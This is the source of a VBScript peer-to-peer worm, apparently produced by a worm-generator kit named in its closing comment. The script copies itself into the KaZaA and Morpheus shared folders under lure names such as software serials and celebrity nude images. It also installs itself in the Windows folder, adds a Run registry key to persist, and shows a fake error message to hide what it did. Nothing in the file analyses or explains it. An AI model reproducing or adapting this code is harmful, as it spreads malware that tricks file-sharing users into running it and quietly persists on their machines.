On Error Resume Next
Dim HellPWG.B
Dim IGUBGfso,IGUBGws,IGUBGfiles
Dim IGUBGkaz
Dim IGUBGmor
Dim IGUBGbear
Dim IGUBGprfi
Dim IGUBGwrm
Dim IGUBGwin
Dim IGUBGgrok
Set IGUBGfso = CreateObject("Scripting.fileSystemobject")
Set IGUBGws = CreateObject("Wscript.Shell")
Set IGUBGwin = IGUBGfso.GetSpecialFolder(0)
IGUBGwrm = Wscript.ScriptFullName
IGUBGfiles = Array("Visual Basic 6 Serial","Delphi 7 Serial","Delphi Enterprise Edition","FireWorks 4","Virtual Girl Lorena","Virtual Girl","Sex.jpg","KylieMinogue_nude_sex","ShakiraNaked.jpg","ShakiraAllBody.jpg")
IGUBGprfi = IGUBGws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
IGUBGkaz = IGUBGprfi & "\KaZaA\My Shared Folder\"
If IGUBGfso.FolderExists(IGUBGkaz) = True Then
For IGUBGcop = 0 To 9
IGUBGfso.copyfile IGUBGwrm,IGUBGkaz &IGUBGfiles(IGUBGcop) & ".vbs"
Next
End If
IGUBGmor = IGUBGprfi & "\Morpheus\My Shared Folder\"
If IGUBGfso.FolderExists(IGUBGmor) = True Then
For IGUBGs = 0 To 9
IGUBGfso.copyfile IGUBGwrm,IGUBGmor &IGUBGfiles(IGUBGs) & ".vbs"
Next
End If
IGUBGfso.copyfile IGUBGwrm, IGUBGwin & "\" & Wscript.ScriptName
IGUBGws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\HellPWG", IGUBGwin & "\" & Wscript.ScriptName
MsgBox "The file is corrupted",0,"Error"
Set IGUBGws = Nothing
Set IGUBGfso = Nothing
'Made in with Hell P2P Worm Generator v1.9 by Falckon/ViriiZOne
'http://www.viriizone.tk
